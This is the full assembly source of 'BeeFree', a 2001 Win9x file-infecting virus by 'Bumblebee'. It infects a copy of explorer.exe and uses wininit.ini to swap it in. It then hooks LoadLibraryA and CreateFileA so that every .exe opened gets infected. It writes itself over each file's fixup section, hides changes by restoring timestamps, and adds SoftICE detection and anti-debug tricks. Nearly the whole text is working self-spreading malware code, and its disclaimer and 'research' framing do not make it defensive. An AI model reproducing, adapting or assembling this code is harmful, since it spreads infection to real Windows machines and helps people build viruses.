   ;
   ;  BeeFree (2110 bytes)
   ;  Coded by Bumblebee
   ;
   ;   DISCLAIMER
   ;   . This is the source  code of a VIRUS. The author  is not responsabile
   ;   of any  damage that  may occur  due to the assembly of this file.  Use
   ;   it at your own risk.
   ;
   ;   OVERVIEW
   ;   . I coded this virus to research 'different' residency methods.
   ;   . That's a little  resident virus  by the way of infecting explorer in
   ;   disk. It uses  wininit stuff for replacing the  old explorer  with the
   ;   infected copy  that hooks  ALL CreateFileA  calls from Dlls  loaded by
   ;   explorer. It has no other way of  infection. Since it is direct action
   ;   aganist  explorer, that's enought. It has a main  hook that catchs all
   ;   LoadLibraryA calls from explorer. The routine that  gets control hooks
   ;   then CreateFileA in each Dll that is loaded. It's kinda infectious :)
   ;   . Infects  overwritting fixups  table and making  executable fixed. It
   ;   doesn't infects DLL PE due this method. I know there are not very much
   ;   files with relocs out there, but since this is  research virus i don't
   ;   care. This way is simple and lets the virus being smaller.
   ;   . I've only included win9x stuff, but easily can be modified to handle
   ;   other win32 systems.
   ;   . It checks self integrity with CRC32.
   ;   . Gets needed APIs using CRC32 instead of names.
   ;   . It won't infect files smaller than 8kbs.
   ;   . Has SoftIce detection routine for win9x and little anti-debug trick.
   ;   It has two  different ways to act  under debug  session: act and pass.
   ;   Under act way the  virus will halt  the process and  under pass way it
   ;   will fail in some execution point. Those fails  will result in a quick
   ;   return-to-host  or even in a fault. In both  cases it will seem like a
   ;   bug. It is not buggy >8) But as ever, anti-debug tricks are nothing if
   ;   the av  gay it good enought. At  least it's going to make him think...
   ;   But that's only for analisys pruposes, sure they can detect this virus
   ;   without many hard work.
   ;
   ;   I want to thanx Virusbuster for his betatesting. Pues eso: Thanx!
   ;   Under Virusbuster's tests we noticed about 40 infections in a flat
   ;   Win98 system. There are some files with relocs after all!
   ;
   ;
   ;                                                       The way of the bee
   ;
   .486p
   locals
   .model flat,STDCALL

           extrn           ExitProcess:PROC        ; needed for 1st generation
           extrn           MessageBoxA:PROC

   ; my little debug macro with hardcoded addr for my system
   @debug   macro   title,reg
           pushad
           push    1000h
           call    @@tit
           db      title,0
   @@tit:
           push    reg
           push    0h
           mov     eax,0bff5412eh
           call    eax
           popad
   endm
           vSize           equ     vEnd-vBegin
           MAX_STR         equ     160
   .DATA
           ; dummy data
           db      'WARNING - This is a virus carrier - WARNING'
   .CODE
   inicio:
           ; setup self integrity checksum for 1st generation
           lea     esi,vBegin
           mov     edi,vSize-4
           call    CRC32
           mov     dword ptr [checksum],eax

   ALIGN   1000h   ; align to 4kbs... ignore tasm warning

   vBegin  label   byte
           push    offset fakeHost
   hostEP  equ     $-4
           pushad

           call    GetDelta

           lea     esi,vBegin+ebp
           mov     edi,vSize-4
           call    CRC32
           mov     edx,dword ptr [checksum+ebp]
           xor     edx,eax                         ; self integrity check
                                                   ; if fails edx won't be
                                                   ; zero

           lea     eax,dword ptr [esp-8h]          ; setup SEH frame
           xchg    eax,dword ptr fs:[edx]
           lea     edi,GetKernel32Exception+ebp
           push    edi
           push    eax

           mov     esi,0bff70000h                  ; check win9x is out
           cmp     word ptr [esi],'ZM'             ; there!
           jne     GetKernel32NotFound
           mov     dx,word ptr [esi+3ch]
           cmp     esi,dword ptr [esi+edx+34h]
           jne     GetKernel32NotFound

           xor     eax,eax                         ; remove SEH
           pop     dword ptr fs:[eax]
           pop     eax

   getAPIsNow:
           ; now get APIs using CRC32
           mov     edi,esi
           mov     esi,dword ptr [esi+3ch]
           add     esi,edi
           mov     esi,dword ptr [esi+78h]
           add     esi,edi
           add     esi,1ch

           lodsd
           add     eax,edi
           mov     dword ptr [address+ebp],eax
           lodsd
           add     eax,edi
           mov     dword ptr [names+ebp],eax
           lodsd
           add     eax,edi
           mov     dword ptr [ordinals+ebp],eax

           sub     esi,16
           lodsd
           mov     dword ptr [nexports+ebp],eax

           xor     edx,edx
           mov     dword ptr [expcount+ebp],edx
           lea     eax,FSTAPI+ebp

   searchl:
           mov     esi,dword ptr [names+ebp]
           add     esi,edx
           mov     esi,dword ptr [esi]
           add     esi,edi
           push    eax edx edi
           xor     edi,edi
           movzx   di,byte ptr [eax+4]
           call    CRC32
           xchg    ebx,eax
           pop     edi edx eax
           cmp     ebx,dword ptr [eax]
           je      fFound
           add     edx,4
           inc     dword ptr [expcount+ebp]
           push    edx
           mov     edx,dword ptr [expcount+ebp]
           cmp     dword ptr [nexports+ebp],edx
           pop     edx
           je      returnHost
           jmp     searchl
   fFound:
           shr     edx,1
           add     edx,dword ptr [ordinals+ebp]
           xor     ebx,ebx
           mov     bx,word ptr [edx]
           shl     ebx,2
           add     ebx,dword ptr [address+ebp]
           mov     ecx,dword ptr [ebx]
           add     ecx,edi
           mov     dword ptr [eax+5],ecx
           add     eax,9
           xor     edx,edx
           mov     dword ptr [expcount+ebp],edx
           lea     ecx,ENDAPI+ebp
           cmp     eax,ecx
           jb      searchl

           xor     eax,eax                         ; softice detection
           push    eax                             ; for win9x
           inc     edx
           push    edx
           push    00000003h
           push    eax
           inc     eax
           push    eax
           push    80000000h
           call    checkSice
           db      '\\.\SICE',0
   checkSice:
           call    dword ptr [_CreateFileA+ebp]    ; open file
           inc     eax
           jz      notSice
           dec     eax
           call    dword ptr [_CloseHandle+ebp]
           cli
           jmp     esp                             ; if found... fault!

   notSice:
           ; residence sign explanation:
           ; we create a shared pieze of memory as buffer
           ; we use a named object and assume we are resident if
           ; this object already exists, that's true coz infected
           ; explorer execs 1st and creates it
           lea     esi,tmpfilename+ebp
           inc     esi
           xor     eax,eax                         ; 1st get memory for
           push    esi                             ; some buffers
           push    MAX_STR*7                       ; do not free it later
           push    eax                             ; there is a lot of mem :)
           push    00000004h                       ; use shared mem as
           push    eax                             ; residence sign
           dec     eax
           push    eax
           call    dword ptr [_CreateFileMappingA+ebp]
           or      eax,eax
           jz      returnHost

           mov     dword ptr [buffer0+ebp],eax     ; save handle

           call    dword ptr [_GetLastError+ebp]
           cmp     eax,0b7h
           je      returnHost                      ; already resident

           cmp     byte ptr [isexplorer+ebp],0
           je      skipExplorerStuff

           mov     eax,1234568h                    ; hook LoadLibraryA
   currAddr        equ $-4
           mov     ecx,dword ptr [_LoadLibraryA+ebp]
           mov     dword ptr [LLRetAddr+ebp],ecx
           lea     esi,LoadLibraryAHook+ebp
           call    APIHook                         ; hook!

           mov     eax,dword ptr [_CreateFileA+ebp]
           mov     dword ptr [CFAhookRet+ebp],eax  ; setup CreateFileA
                                                   ; ret addr

                                                   ; we are into explorer
           dec     byte ptr [isexplorer+ebp]       ; yet, clear flag

           jmp     returnHost

   skipExplorerStuff:
           xor     eax,eax
           push    eax
           push    eax
           push    eax
           push    00000004h OR 00000002h
           push    dword ptr [buffer0+ebp]
           call    dword ptr [_MapViewOfFile+ebp]  ; map a view for the obj
           or      eax,eax
           jz      returnHost

           mov     dword ptr [buffer0+ebp],eax     ; buffers
           add     eax,MAX_STR
           mov     dword ptr [buffer1+ebp],eax
           add     eax,MAX_STR
           mov     dword ptr [buffer3+ebp],eax
           add     eax,MAX_STR
           mov     dword ptr [buffer2+ebp],eax

           push    MAX_STR                         ; get windows folder
           push    dword ptr [buffer3+ebp]
           call    dword ptr [_GetWindowsDirectoryA+ebp]
           or      eax,eax
           jz      returnHost

           mov     eax,dword ptr [buffer0+ebp]     ; fix buffer
           mov     byte ptr [eax],0

           push    dword ptr [buffer3+ebp]         ; make temp filename
           push    eax                             ; string
           call    dword ptr [_lstrcat+ebp]

           lea     edi,tmpfilename+ebp
           push    edi
           push    dword ptr [buffer0+ebp]
           call    dword ptr [_lstrcat+ebp]

           mov     eax,dword ptr [buffer1+ebp]     ; fix buffer
           mov     byte ptr [eax],0

           push    dword ptr [buffer3+ebp]         ; make explorer
           push    eax                             ; string
           call    dword ptr [_lstrcat+ebp]

           lea     edi,explorer+ebp
           push    edi
           push    dword ptr [buffer1+ebp]
           call    dword ptr [_lstrcat+ebp]

           push    1
           push    dword ptr [buffer0+ebp]
           push    dword ptr [buffer1+ebp]
           call    dword ptr [_CopyFileA+ebp]      ; copy and fail if exists
           or      eax,eax
           jz      returnHost

           inc     byte ptr [isexplorer+ebp]       ; infecting explorer

           mov     esi,dword ptr [buffer0+ebp]
           call    infect                          ; infect copy

           dec     byte ptr [isexplorer+ebp]       ; back to non-resident

           mov     eax,dword ptr [buffer2+ebp]     ; fix buffer
           mov     byte ptr [eax],0

           lea     edi,wininitstr+ebp              ; put rename
           push    edi
           push    eax
           call    dword ptr [_lstrcat+ebp]

           push    dword ptr [buffer1+ebp]         ; put exlorer string
           push    dword ptr [buffer2+ebp]
           call    dword ptr [_lstrcat+ebp]

           lea     esi,equalsign+ebp               ; put equal sign :)
           push    esi
           push    dword ptr [buffer2+ebp]
           call    dword ptr [_lstrcat+ebp]

           push    dword ptr [buffer0+ebp]         ; put temp filename
           push    dword ptr [buffer2+ebp]
           call    dword ptr [_lstrcat+ebp]

           mov     eax,dword ptr [buffer0+ebp]     ; fix buffer
           mov     byte ptr [eax],0

           push    dword ptr [buffer3+ebp]         ; make wininit.ini
           push    eax                             ; string
           call    dword ptr [_lstrcat+ebp]

           lea     esi,wininit+ebp
           push    esi
           push    dword ptr [buffer0+ebp]
           call    dword ptr [_lstrcat+ebp]

           xor     eax,eax
           push    eax
           push    00000080h
           push    00000002h                       ; create always
           push    eax
           push    eax
           push    40000000h
           push    dword ptr [buffer0+ebp]
           call    dword ptr [_CreateFileA+ebp]    ; open wininit.ini
           inc     eax
           jz      returnHost
           dec     eax

           mov     edi,dword ptr [buffer2+ebp]     ; bytes to write
           mov     esi,edi
   getLength:
           cmp     byte ptr [edi],0
           je      lengthOK
           inc     edi
           jmp     getLength
   lengthOK:
           sub     edi,esi

           push    eax                             ; save file handle
           push    0                               ; write'em all!
           push    dword ptr [buffer0+ebp]         ; shit
           push    edi                             ; size
           push    dword ptr [buffer2+ebp]         ; buffer to write
           push    eax                             ; file handle
           call    dword ptr [_WriteFile+ebp]
           pop     eax

           push    eax                             ; close file
           call    dword ptr [_CloseHandle+ebp]

   returnHost:                                     ; go home baby
           popad
           ret

   GetKernel32Exception:
           xor     eax,eax
           mov     eax,dword ptr fs:[eax]
           mov     esp,dword ptr [eax]
   GetKernel32NotFound:
           xor     eax,eax
           pop     dword ptr fs:[eax]
           pop     eax
           popad
           ret
   ;
   ; Hooks LoadLibraryA for hooking all CreateFileA calls.
   ;
   LoadLibraryAHook:
           pushad
           call    GetDelta

           mov     esi,dword ptr [esp+24h]         ; get dll filename

           or      esi,esi                         ; check filename!=NULL
           jz      notNeededDll

   ;
   ;       Nice messagebox appears each time LoadLibraryA is called.
   ;
   ;       @debug  "loadLibraryHook",esi           ; debug code

           push    esi
           call    dword ptr [_LoadLibraryA+ebp]   ; load dll
           push    eax
           pop     dword ptr [retValue+ebp]
           or      eax,eax
           jz      notHookDll                      ; uh?

                                                   ; now hook CreateFileA
           mov     ecx,dword ptr [_CreateFileA+ebp]
           lea     esi,CreateFileAHook+ebp
           call    APIHook                         ; hook!

   notHookDll:
           popad
           mov     eax,12345678h
   retValue        equ $-4
           ret     4                               ; return and fix stack

   notNeededDll:
           popad
           push    12345678h
   LLRetAddr       equ $-4
           ret

   ;
   ; Calcs Delta offset (incredible!)
   ;
   GetDelta:
           call    delta
   delta:
           pop     ebp
           sub     ebp,offset delta
           ret

   ;
   ; Our CreateFileA hook.
   ;
   CreateFileAHook:
           pushad
           call    GetDelta

           mov     eax,0000001h                    ; for reentrance fix
   multiThread     equ $-4
           or      eax,eax
           jz      busy

           dec     dword ptr [multiThread+ebp]     ; set to busy

           mov     esi,dword ptr [esp+24h]         ; get filename
           or      esi,esi                         ; check filename!=NULL
           jz      flee

           mov     edi,esi                         ; goto end of string
   getExt:
           cmp     byte ptr [edi],0
           je      checkExt
           inc     edi
           jmp     getExt
   checkExt:
           push    edi                             ; check string length
           sub     edi,esi
           cmp     edi,4
           pop     edi
           jb      flee

           cmp     byte ptr [edi-1],'"'            ; skip " shit
           jne     notShitThere
           dec     edi
   notShitThere:
           mov     edi,dword ptr [edi-4]           ; check extension
           or      edi,20202000h                   ; is exe
           cmp     edi,'exe.'
           jne     flee

   rightExt:

   ;
   ;       This debug line should show files that are infected, or
   ;       at least files that should be nice to infect.
   ;
   ;       @debug  "Exe found",esi                 ; debug code

           call    infect                          ; huahahaha!

   flee:
           inc     dword ptr [multiThread+ebp]     ; set to available
   busy:
           popad
           push    12345678h
   CFAhookRet      equ $-4
           ret

   ;
   ; Infects PE file overwritting fixup section. That's a very easy
   ; infection method regarding you take care of some tips.
   ;
   ; There are not very much files with relocs out there... but at least
   ; explorer in my system has them :)
   ;
   ; As result infected PE will appear as fixed executable with a section
   ; that is not used (we know that's not true). Take a look with tdump
   ; into a file before and after infection.
   ;
   ; ESI: addr of file name of PE to infect.
   ;
   infect:
           pushad
           push    esi                             ; save filename
           push    esi
           call    dword ptr [_GetFileAttributesA+ebp]
           pop     esi                             ; restore filename
           inc     eax
           jz      infectionError
           dec     eax

           mov     dword ptr [fileAttrib+ebp],eax  ; save attributes

           push    esi                             ; save filename
           push    00000080h                       ; clear file attributes
           push    esi
           call    dword ptr [_SetFileAttributesA+ebp]
           pop     esi                             ; restore filename
           or      eax,eax
           jz      infectionError

           push    esi                             ; save filename

           xor     eax,eax
           push    eax
           push    00000080h
           push    00000003h
           push    eax
           push    eax
           push    80000000h OR 40000000h
           push    esi
           call    dword ptr [_CreateFileA+ebp]    ; open file
           inc     eax
           jz      infectionErrorAttrib
           dec     eax

           mov     dword ptr [fHnd+ebp],eax        ; save handle

           push    0h
           push    eax
           call    dword ptr [_GetFileSize+ebp]    ; get filesize
           inc     eax
           jz      infectionErrorClose
           dec     eax

           cmp     eax,8000h                       ; check at least is
           jb      infectionErrorClose             ; 8 kbs long

           mov     dword ptr [fileSize+ebp],eax

           lea     edi,fileTime2+ebp
           push    edi
           lea     edi,fileTime1+ebp
           push    edi
           lea     edi,fileTime0+ebp
           push    edi
           push    dword ptr [fHnd+ebp]
           call    dword ptr [_GetFileTime+ebp]    ; get file date/time
           or      eax,eax
           jz      infectionErrorClose

           xor     eax,eax
           push    eax
           push    eax
           push    eax
           push    00000004h
           push    eax
           push    dword ptr [fHnd+ebp]            ; create a file map obj
           call    dword ptr [_CreateFileMappingA+ebp]
           or      eax,eax
           jz      infectionErrorClose

           mov     dword ptr [fhmap+ebp],eax       ; save handle

           xor     eax,eax
           push    eax
           push    eax
           push    eax
           push    00000004h OR 00000002h
           push    dword ptr [fhmap+ebp]
           call    dword ptr [_MapViewOfFile+ebp]  ; map a view for the obj
           or      eax,eax
           jz      infectionErrorCloseMap

           mov     dword ptr [mapMem+ebp],eax      ; save addr

           mov     edi,eax
           cmp     word ptr [edi],'ZM'             ; check exe
           jne     infectionErrorCloseUnmap

           add     edi,dword ptr [edi+3ch]         ; check PE: avoid
           cmp     eax,edi                         ; not PE with fucking
           ja      infectionErrorCloseUnmap        ; data in DOS header
           add     eax,dword ptr [fileSize+ebp]
           cmp     eax,edi
           jb      infectionErrorCloseUnmap
           cmp     word ptr [edi],'EP'
           jne     infectionErrorCloseUnmap

           movzx   edx,word ptr [edi+16h]          ; check executable
           test    edx,2h
           jz      infectionErrorCloseUnmap
           test    edx,1h                          ; check has reloc
           jnz     infectionErrorCloseUnmap
           test    edx,2000h                       ; check not DLL
           jnz     infectionErrorCloseUnmap
           movzx   edx,word ptr [edi+5ch]
           dec     edx                             ; check not native
           jz      infectionErrorCloseUnmap

           mov     esi,edi
           mov     edx,dword ptr [esi+0a0h]
           mov     ebx,dword ptr [esi+0a4h]
           cmp     ebx,vSize                       ; check there is
           jb      infectionErrorCloseUnmap        ; enough size

           mov     eax,18h
           add     ax,word ptr [edi+14h]
           add     edi,eax                         ; goto 1st section

           movzx   ecx,word ptr [esi+06h]          ; look for fixup sect
   checkSection:
           cmp     dword ptr [edi+0ch],edx
           je      relocFound
   nextSection:
           add     edi,28h
           dec     ecx
           jnz     checkSection
           jmp     infectionErrorCloseUnmap
   relocFound:
           cmp     dword ptr [edi+10h],ebx         ; check phys size
           jb      infectionErrorCloseUnmap
           mov     dword ptr [edi+24h],0e0000020h  ; set sect properties
           mov     eax,dword ptr [edi+0ch]         ; section RVA as EP
           xchg    eax,dword ptr [esi+28h]
           mov     edx,dword ptr [esi+34h]
           mov     dword ptr [currAddr+ebp],edx    ; save address (for
                                                   ; explorer stuff)
           add     eax,edx
           mov     dword ptr [hostEP+ebp],eax      ; save old EP
           inc     word ptr [esi+16h]              ; set fixed flag
                                                   ; (relocs are not longer
                                                   ; available)
           xor     eax,eax
           mov     dword ptr [esi+0a0h],eax        ; clear fixup
           mov     dword ptr [esi+0a4h],eax        ; clear fixup

           push    edi
           lea     esi,vBegin+ebp
           push    esi
           mov     edi,vSize-4
           call    CRC32

           pop     esi edi
           mov     dword ptr [checksum+ebp],eax    ; update self checksum

           mov     edi,dword ptr [edi+14h]         ; copy virus
           add     edi,dword ptr [mapMem+ebp]
           mov     ecx,vSize
           rep     movsb

   infectionErrorCloseUnmap:
           push    dword ptr [mapMem+ebp]          ; unmap view
           call    dword ptr [_UnmapViewOfFile+ebp]

   infectionErrorCloseMap:
           push    dword ptr [fhmap+ebp]           ; close map file obj
           call    dword ptr [_CloseHandle+ebp]

           lea     edi,fileTime2+ebp
           push    edi
           lea     edi,fileTime1+ebp
           push    edi
           lea     edi,fileTime0+ebp
           push    edi
           push    dword ptr [fHnd+ebp]            ; restore date/time
           call    dword ptr [_SetFileTime+ebp]

   infectionErrorClose:
           push    dword ptr [fHnd+ebp]            ; close file
           call    dword ptr [_CloseHandle+ebp]

   infectionErrorAttrib:
           pop     esi                             ; restore filename
           push    dword ptr [fileAttrib+ebp]
           push    esi                             ; restore attributes
           call    dword ptr [_SetFileAttributesA+ebp]

   infectionError:
           popad
           ret

   ;
   ; This routine makes CRC32.
   ;
   CRC32:
       cld
           xor     ecx,ecx
           dec     ecx
       mov     edx,ecx
       push    ebx
   NextByteCRC:
       xor     eax,eax
       xor     ebx,ebx
       lodsb
           add     eax,dword ptr fs:[ebx+20h]      ; simple anti-debug
           xor     al,cl                           ; inside crc32 loop is
           mov     cl,ch                           ; annoying
       mov     ch,dl
       mov     dl,dh
       mov     dh,8
   NextBitCRC:
       shr     bx,1
       rcr     ax,1
       jnc     NoCRC
       xor     ax,08320h
       xor     bx,0EDB8h
   NoCRC:
           dec     dh
       jnz     NextBitCRC
       xor     ecx,eax
       xor     edx,ebx
           dec     edi
       jnz     NextByteCRC
       pop     ebx
       not     edx
       not     ecx
       mov     eax,edx
       rol     eax,16
       mov     ax,cx
       ret

   ;
   ; API hook routine.
   ;
   ; in:
   ;       eax     addr of loaded module
   ;       ecx     addr of API to hook
   ;       esi     addr of hook routine
   ; out:
   ;       eax     0 on error
   ;
   APIHook:
           push    esi
           mov     edx,eax
           mov     edi,edx
           add     edi,dword ptr [edx+3ch]         ; begin PE header
           mov     edi,dword ptr [edi+80h]         ; RVA import
           or      edi,edi                         ; uh? no imports??? :)
           jz      skipHookErr
           add     edi,edx                         ; add base addr
   searchK32Imp:
           mov     esi,dword ptr [edi+0ch]         ; get name
           or      esi,esi                         ; check is not last
           jz      skipHookErr
           add     esi,edx                         ; add base addr
           mov     ebx,dword ptr [esi]
           or      ebx,20202020h
           cmp     ebx,'nrek'                      ; look for Kernel32 module
           jne     nextName
           mov     ebx,dword ptr [esi+4]
           or      ebx,00002020h
           cmp     ebx,'23le'                      ; kernel32 found
           je      k32ImpFound
   nextName:                                       ; if not found check
           add     edi,14h                         ; name of next import
           mov     esi,dword ptr [edi]             ; module
           or      esi,esi
           jz      skipHookErr
           jmp     searchK32Imp
   k32ImpFound:                                    ; now we have k32
           mov     esi,dword ptr [edi+10h]         ; get address table
           or      esi,esi                         ; heh
           jz      skipHookErr
           add     esi,edx                         ; add base addr again

           mov     edi,ecx                         ; search for API
   nextImp:
           lodsd                                   ; get addrs
           or      eax,eax                         ; chek is not last
           jz      skipHookErr ; *
           cmp     eax,edi                         ; cmp with API addr
           je      doHook                          ; found? hook!
           jmp     nextImp                         ; check next in table
   doHook:
           sub     esi,4
           push    esi                             ; save import addr

           call    dword ptr [_GetCurrentProcess+ebp]

           pop     esi edx
           mov     dword ptr [fileSize+ebp],edx    ; tmp storage

           lea     edi,fileAttrib+ebp
           push    edi                             ; tmp storage for shit
           push    4
           lea     edi,fileSize+ebp
           push    edi                             ; bytes to write
           push    esi                             ; where to write
           push    eax                             ; current process
           call    dword ptr [_WriteProcessMemory+ebp]
   skipHook:
           ret
   skipHookErr:
           pop     esi ; *
           xor     eax,eax
           ret

   ; * those both lines had a bug in the released version... it will
   ; crash if no API is hooked (this won't happen)

   ; api search data ----------------------------------------------------------
   address         dd      0
   names           dd      0
   ordinals        dd      0
   nexports        dd      0
   expcount        dd      0

   FSTAPI                  label   byte
   CrcGetCurrentProcess    dd      003690e66h
                           db      18
   _GetCurrentProcess      dd      0

   CrcWriteProcessMemory   dd      00e9bbad5h
                           db      19
   _WriteProcessMemory     dd      0

   CrcLoadLibraryA         dd      04134d1adh
                           db      13
   _LoadLibraryA           dd      0

   CrcCreateFileA          dd      08c892ddfh
                           db      12
   _CreateFileA            dd      0

   CrcMapViewOfFile        dd      0797b49ech
                           db      14
   _MapViewOfFile          dd      0

   CrcCreatFileMappingA    dd      096b2d96ch
                           db      19
   _CreateFileMappingA     dd      0

   CrcUnmapViewOfFile      dd      094524b42h
                           db      16
   _UnmapViewOfFile        dd      0

   CrcCloseHandle          dd      068624a9dh
                           db      12
   _CloseHandle            dd      0

   CrcGetFileTime          dd      04434e8feh
                           db      12
   _GetFileTime            dd      0

   CrcSetFileTime          dd      04b2a3e7dh
                           db      12
   _SetFileTime            dd      0

   CrcSetFileAttributesA   dd      03c19e536h
                           db      19
   _SetFileAttributesA     dd      0

   CrcGetFileAttributesA   dd      0c633d3deh
                           db      19
   _GetFileAttributesA     dd      0

   CrcGetFileSize          dd      0ef7d811bh
                           db      12
   _GetFileSize            dd      0

   CrcCopyFileA            dd      05bd05db1h
                           db      10
   _CopyFileA              dd      0

   CrcGetWindowsDirectoryA dd      0fe248274h
                           db      21
   _GetWindowsDirectoryA   dd      0

   Crclstrcat              dd      00792195bh
                           db      8
   _lstrcat                dd      0

   CrcWriteFile            dd      021777793h
                           db      10
   _WriteFile              dd      0

   CrcGetLastError         dd      087d52c94h
                           db      13
   _GetLastError           dd      0
   ENDAPI                  label   byte
   ; api search data ends -----------------------------------------------------
   ; infection data -----------------------------------------------------------
   fileSize        dd      0
   fileAttrib      dd      0
   fileTime0       dd      0,0
   fileTime1       dd      0,0
   fileTime2       dd      0,0
   fHnd            dd      0
   fhmap           dd      0
   mapMem          dd      0
   ; infection data ends ------------------------------------------------------
   ; wininit stuff ------------------------------------------------------------
   wininitstr      db      '[rename]',0dh,0ah,0
   wininit         db      '\wininit.ini',0
   explorer        db      '\explorer.exe',0
   tmpfilename     db      '\beefree.sys',0
   equalsign       db      '=',0
   buffer0         dd      0
   buffer1         dd      0
   buffer2         dd      0
   buffer3         dd      0
   ; wininit stuff ends -------------------------------------------------------
   isexplorer      db      0h                      ; explorer flag
   checksum        dd      0h                      ; self integrity checksum
   vEnd    label   byte

   ;
   ; Fake host needed for 1st gen
   ;
   fakeHost:
           push    1000h
           call    title
           db      '(C) 2001 Bumblebee',0
   title:  call    mess
           db      'BeeFree(TM) is running. Have a nice day!',0
   mess:
           push    0h
           call    MessageBoxA

           push    0h
           call    ExitProcess
   Ends
   End     inicio
